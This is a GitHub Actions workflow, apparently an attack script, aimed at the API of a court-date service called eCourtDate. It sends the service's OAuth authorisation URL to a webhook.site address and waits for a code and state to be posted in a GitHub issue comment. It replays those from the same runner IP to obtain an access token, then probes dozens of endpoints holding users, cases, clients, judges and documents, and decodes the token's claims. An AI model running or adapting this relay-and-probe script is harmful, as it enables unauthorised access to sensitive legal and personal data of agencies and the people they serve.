name: batt
on:
  workflow_dispatch:
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - name: battery
        run: |
          set +e
          H1=https://api.ecourtdate.com
          echo "=== 1. GET /oauth/ecdauth0 (issuer of state, THIS runner IP) ==="
          echo "RUNNER_IP=$(curl -s --max-time 10 https://api.ipify.org)"
          curl -s --max-time 20 "$H1/oauth/ecdauth0" -o /tmp/au.json -w 'STATUS=%{http_code}\n'
          AU=$(jq -r 'if type=="object" then (.url // (.[] | tostring)) else . end' /tmp/au.json 2>/dev/null | head -1)
          echo "AUTHURL_LEN=${#AU}"
          curl -s --max-time 15 -X POST -H 'Content-Type: text/plain' --data-binary "$AU" "https://webhook.site/2551e930-e755-4cf9-a54a-a354eb2f85cf" -o /dev/null -w 'WH_POST=%{http_code}\n'
          echo "=== 2. POLL issue comments for code (max 9 min) ==="
          GOT=""
          for i in $(seq 1 54); do
            sleep 10
            RESP=$(curl -s --max-time 15 "https://api.github.com/repos/Rohanlew007/edcd-batt/issues/1/comments?per_page=5" || true)
            BODY=$(echo "$RESP" | jq -r '[.[] | select(.body | contains("CODE=")) | .body] | first // empty' 2>/dev/null || true)
            if [ -n "$BODY" ]; then
              GOT="$BODY"
              echo "CODE RECEIVED after $i polls"
              break
            fi
          done
          if [ -z "$GOT" ]; then echo "NO CODE - TIMEOUT"; exit 0; fi
          CD=$(echo "$GOT" | sed 's/.*CODE=\([^ ]*\).*/\1/')
          ST=$(echo "$GOT" | sed 's/.*STATE=\([^ ]*\).*/\1/')
          echo "CD_LEN=${#CD} ST_LEN=${#ST}"
          echo "=== 3. redirect (SAME runner IP as issuer) ==="
          LOC=$(curl -s --max-time 20 -o /dev/null -D /tmp/h -w '%{http_code}' "$H1/oauth/ecdauth0/redirect?code=$CD&state=$ST")
          echo "STATUS=$LOC"
          grep -i '^location:' /tmp/h | head -c 200; echo
          echo "=== 4. auth/user (SAME IP, axios-style headers) ==="
          curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' -H 'Referer: https://app.ecourtdate.com/login?state='"$ST" "$H1/auth/user?state=$ST" -o /tmp/tu.json -w 'STATUS=%{http_code}\n'
          AT=$(jq -r 'if .access_token then .access_token else "FAIL" end' /tmp/tu.json 2>/dev/null || echo PARSE_ERR)
          echo "AT_LEN=${#AT}"
          if [ -z "$AT" ] || [ "$AT" = "FAIL" ] || [ "$AT" = "PARSE_ERR" ]; then
            echo "--- variant: us-east auth/user ---"
            curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' "https://us-east.api.ecourtdate.com/auth/user?state=$ST" -o /tmp/tu2.json -w 'STATUS=%{http_code}\n'
            AT=$(jq -r 'if .access_token then .access_token else "FAIL" end' /tmp/tu2.json 2>/dev/null || echo PARSE_ERR)
            echo "AT_LEN2=${#AT}"
            if [ -z "$AT" ] || [ "$AT" = "FAIL" ] || [ "$AT" = "PARSE_ERR" ]; then head -c 150 /tmp/tu2.json; echo; exit 0; fi
          fi
          echo "=== 5. BATTERY canonical ==="
          for p in /v1/users/current /v1/users /v1/agencies /v1/agency /v1/schedules /v1/schedules/current /v1/schedules/upcoming /v1/schedules/ics /v1/schedules/total /v1/schedules/random /v1/opens /v1/opens/total /v1/availabilities /v1/availabilities/days /v1/geolocations /v1/forms /v1/locations /v1/portals /v1/checkins /v1/events /v1/events/json /v1/contacts /v1/cases /v1/clients /v1/interpreters /v1/messages /v1/chats /v1/chatbots /v1/tasks /v1/documents /v1/posts /v1/subscriptions /v1/webhooks /v1/citations /v1/reports /v1/search /v1/judges /v1/flows /v1/lookups /v1/dashboards /v1/files /v1/calendars /v1/organizations /v1/roles /v1/settings /v1/supervisions; do
            code=$(curl -s -o /tmp/b -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$H1$p" || echo ERR)
            echo "C GET $p -> $code :: $(head -c 170 /tmp/b | tr '\n' ' ')"
            sleep 1
          done
          echo "=== 5b. BATTERY us-east ==="
          for p in /v1/users/current /v1/schedules /v1/locations /v1/events /v1/settings /v1/roles /v1/agencies; do
            code=$(curl -s -o /tmp/b -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "https://us-east.api.ecourtdate.com$p" || echo ERR)
            echo "U GET $p -> $code :: $(head -c 170 /tmp/b | tr '\n' ' ')"
            sleep 1
          done
          echo "=== 6. CLAIMS ==="
          jq -r '.access_token | split(".")[1] | @base64d | fromjson | del(.sub) | tojson' /tmp/tu.json 2>/dev/null | head -c 400; echo
          echo "BATT22_DONE"
